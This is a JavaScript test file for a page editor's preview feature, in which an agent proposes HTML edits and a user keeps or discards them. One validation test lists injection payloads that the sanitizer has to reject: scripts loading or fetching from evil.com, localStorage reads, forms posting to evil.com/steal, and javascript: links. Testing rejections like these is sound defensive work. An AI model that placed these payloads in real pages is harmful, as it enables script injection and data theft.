// Checks for chat-initiated canvas previews (src/previews.js). Run: npm test
import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import {
  checkPreview,
  checkPreviewHtml,
  clearPreviews,
  decidePreview,
  decidePreviews,
  placePreview,
  previewText,
  readActivePreview,
  readPendingPreviews,
  readPreview,
  readPreviews,
} from "../src/previews.js";

const tmp = () => mkdtempSync(join(tmpdir(), "edityy-previews-"));
const insert = {
  instruction: "add a pricing section",
  action: "insert",
  position: "inside-end",
  html: '<section class="pricing"><h2>Plans</h2></section>',
};

test("a preview is placed, read back, and decided", async () => {
  const root = tmp();
  assert.equal(await readActivePreview(root), null);
  const preview = await placePreview(insert, root);
  assert.match(preview.id, /^e-/);
  assert.equal(preview.status, "active");
  assert.equal((await readActivePreview(root)).id, preview.id);
  assert.equal((await readPreviews(root)).active, preview.id);
  assert.equal((await readPreview(preview.id, root)).instruction, "add a pricing section");
  assert.equal((await readPreviews(root)).history.length, 1);

  const kept = await decidePreview(preview.id, "keep", root);
  assert.equal(kept.status, "kept");
  assert.equal((await readActivePreview(root)).id, preview.id, "a kept preview stays readable for get_preview");

  await decidePreview(preview.id, "discard", root);
  assert.equal(await readActivePreview(root), null, "a discarded preview leaves the canvas path");
  assert.equal((await readPreviews(root)).history[0].status, "discarded");

  await clearPreviews(root);
  assert.equal(await readActivePreview(root), null);
  assert.deepEqual(await readPreviews(root), { active: null, history: [] });
});

test("a new preview replaces the active one and history stays capped", async () => {
  const root = tmp();
  const first = await placePreview(insert, root);
  const second = await placePreview({ ...insert, instruction: "make it darker" }, root);
  assert.equal((await readActivePreview(root)).id, second.id);
  const history = (await readPreviews(root)).history;
  assert.equal(history[0].id, second.id, "newest first");
  assert.ok(history.some((item) => item.id === first.id), "the old one stays in history");
});

test("several previews wait at once, and a batch decides them together", async () => {
  const root = tmp();
  const first = await placePreview(insert, root);
  const second = await placePreview({ ...insert, instruction: "make it darker" }, root);
  // Both wait: the page's checkbox list reads every one still up for a decision.
  const pending = await readPendingPreviews(root);
  assert.deepEqual(pending.map((one) => one.id), [second.id, first.id], "newest first");
  assert.equal(pending.length, 2);

  // Keep the newer, take the older back, in one round like the page's button does.
  const decided = await decidePreviews(
    [
      { id: first.id, keep: false },
      { id: second.id, keep: true },
    ],
    root
  );
  assert.deepEqual(decided, [
    { id: first.id, status: "discarded" },
    { id: second.id, status: "kept" },
  ]);
  assert.equal((await readPendingPreviews(root)).length, 0, "nothing is left for the page to list");
  assert.equal((await readPreviews(root)).history[0].id, second.id);
  assert.equal((await readPreviews(root)).history[0].status, "kept");
  assert.equal((await readActivePreview(root)).id, second.id, "a kept preview stays readable for get_preview");
});

test("each action checks what it needs, and nothing else passes", () => {
  const styles = {
    instruction: "thinner",
    action: "styles",
    selector: "main > div",
    variations: [
      { label: "thin", props: [{ property: "scrollbar-width", value: "thin" }] },
      { label: "words", props: [], text: "new words" },
    ],
  };
  const checked = checkPreview(styles);
  assert.equal(checked.variations[1].text, "new words");

  const bad = [
    null,
    {},
    { ...insert, instruction: "" },
    { ...insert, action: "dance" },
    { ...insert, position: "middle" },
    { ...styles, selector: "" },
    { ...styles, variations: [] },
    { ...styles, variations: [{ label: "", props: [] }] },
    { ...styles, variations: [{ label: "x", props: [], text: "   " }] },
    { instruction: "u", action: "update", selector: "p" },
    { instruction: "u", action: "remove" },
  ];
  for (const value of bad) assert.throws(() => checkPreview(value), { status: 400 }, JSON.stringify(value)?.slice(0, 80));
  for (const value of ["<div>x</div>", "<DIV CLASS=\"a\">x</DIV>", "<img src=\"/a.png\" alt=\"a\">", "<a href=\"/plans\">go</a>", '<script>document.querySelector(\'#m\').classList.toggle(\'open\')</script><div>x</div>', '<div onclick="document.querySelector(\'#m\').classList.toggle(\'open\')">x</div>', '<iframe src="/embed"></iframe>', '<iframe src="https://www.youtube.com/embed/x"></iframe>', '<form action="/subscribe"><input></form>', '<div style="color: red">x</div>', "just words", "<!-- hi --><div>x</div>", '<style>@keyframes slideIn{from{opacity:0}to{opacity:1}}</style><div class="s">x</div>', '<svg xmlns="http://www.w3.org/2000/svg"><circle cx="5" cy="5" r="4"/></svg>', '<table><tr><td>x</td></tr></table>', '<a href="data:image/png;base64,x">x</a>']) {
    assert.equal(checkPreviewHtml(value), value);
  }
  for (const value of ['<script src="https://evil.com/x.js"></script>', '<script src="/app.js"></script>', '<script>fetch("https://evil.com")</script>', '<script>localStorage.getItem("t")</script>', '<script>eval("1")</script>', '<div onclick="fetch(\'https://evil.com\')">x</div>', '<a href="javascript:go()">x</a>', '<a href="data:text/html,-x">x</a>', '<form action="https://evil.com/steal"><input></form>', '<button formaction="https://evil.com/steal">x</button>', '<iframe srcdoc="javascript:alert(1)"></iframe>', '<style>@import url("https://evil.com/x.css");</style><div>x</div>']) {
    assert.throws(() => checkPreviewHtml(value), { status: 400 }, JSON.stringify(value)?.slice(0, 80));
  }
  assert.equal(checkPreview({ instruction: "u", action: "update", selector: "p", props: [{ property: "--x", value: "1" }] }).props[0].property, "--x");
});

test("the agent reads a short preview, not the page", async () => {
  const root = tmp();
  const preview = await placePreview(insert, root);
  const text = previewText(await readPreview(preview.id, root));
  assert.match(text, new RegExp(preview.id));
  assert.match(text, /add a pricing section/);
  assert.match(text, /Anchor: end of main/);
  assert.match(text, /Plans/);
  await assert.rejects(decidePreview("e-nope", "keep", root), /Unknown preview id/);
  await assert.rejects(decidePreview(preview.id, "maybe", root), /keep or discard/);
});

test("one preview takes many elements, and a styles element takes many variations", async () => {
  const root = tmp();
  const many = Array.from({ length: 100 }, (_, i) => ({ label: `look ${i + 1}`, props: [{ property: "color", value: "red" }] }));
  const preview = await placePreview({
    instruction: "restyle two, add one",
    targets: [
      { action: "styles", selector: "h1", variations: many },
      { action: "styles", selector: "p", variations: many.slice(0, 3) },
      { action: "insert", position: "inside-end", html: "<p>new</p>" },
    ],
  }, root);
  assert.equal(preview.targets.length, 3);
  assert.equal(preview.targets[0].variations.length, 100);
  assert.equal((await readPreview(preview.id, root)).targets[2].action, "insert");
  const text = previewText(await readPreview(preview.id, root));
  assert.match(text, /look 100/);
  assert.match(text, /new/);
  assert.throws(() => checkPreview({ instruction: "x", targets: [] }), { status: 400 });
  assert.throws(() => checkPreview({ instruction: "x", targets: [{ action: "styles", selector: "h1", variations: [...many, { label: "one more", props: [] }] }] }), { status: 400 });
  assert.throws(() => checkPreview({ instruction: "x", targets: [{ action: "dance" }] }), { status: 400 });
});
